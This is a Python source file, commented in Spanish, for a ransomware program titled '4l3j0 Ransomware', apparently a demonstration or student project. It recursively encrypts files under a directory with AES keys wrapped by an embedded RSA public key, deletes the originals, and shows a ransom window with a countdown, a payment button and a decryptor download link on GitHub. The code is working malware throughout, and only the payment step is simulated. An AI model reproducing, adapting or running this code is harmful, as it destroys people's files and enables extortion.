import os, requests
import base64
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showinfo

# encoding de clave publica en base64
pubKey = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwOzD6XFGB19gru9+BbpepNDLucaTN/PQkQMkvAPEJgw+6nxrFwHAm2BZeE3dmI0RNL7fm8RxhYC3bT7OxsR8K7biLKAGoXiFNNGPAGferVTMwaF+GW7IGt9/BLMZ9vsnypXx+sHbSvEjew35yrJ1O+ZU/0IGSWVP6/qk/rofd9VjlJ3Fpq38bz79ZxMe4t5vZaoKN8yFlLyEt+q+pRQZenuVuye+Rv2J3advl5JuKyU0OxYeMCk3DviWdvfZBV8wDrTr2fYaLvWuBa21nCtguH8jNsNJa7qBwwphWUsiJhBhewO/njmjFsHBxiQQ52PSZK6yrkUJRHDbXTEM5a2lnwIDAQAB'''
pubKey = base64.b64decode(pubKey)

# funcion para listar archivos en un directorio
def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

# funcion de encriptacion
def encrypt(dataFile, publicKey):

    # leer info del archivo
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convertir a bytes
    data = bytes(data)

    # crear objeto de clave publica
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # encriptar clave de sesion con la clave publica
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encriptar info con la clave de sesion
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # guardar la info encriptada en el archivo
    fileName = dataFile.split(extension)[0]
    fileExtension = '.4l3j0'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)

# moverse al directorio del script
directory = '../' # TODO: cambiar
exludeExtension = ['.py', '.pem', '.exe'] 
for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in exludeExtension:
        continue
    encrypt(filePath, pubKey)


# cuenta regresiva
def countdown(count):

    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

root = tk.Tk()
root.title('4l3j0 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='\nSus archivos han sido encriptados\npor favor pague para poderlos recuperar.\n\n', font=('calibri', 12, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg='white', bg='red')
label.pack()

# crear countdown
countdown('01:30:00')

# funcion para descargar la herramienta de desencripcion
download_dir = os.getcwd()+ '/decryptor.exe'
download_url = 'https://github.com/Alejopadido/4l3j0_ransomware/blob/main/output/decryptor.exe?raw=true'

def download_clicked(dst=download_dir, path=download_url):
    r = requests.get(path)
    open(dst, 'wb').write(r.content)


def pay_clicked():
    showinfo(title='Rescate pagado!', message='Ya puede descargar la herramienta de desencripcion.')
    download_button = ttk.Button(root, text='Descargar herramienta', compound=tk.LEFT, command= download_clicked)
    download_button.pack(ipadx=5, ipady=5, expand=True)

pay_button = ttk.Button(root, text='Pagar', compound=tk.LEFT, command= pay_clicked)

pay_button.pack(ipadx=5, ipady=5, expand=True)

root.mainloop()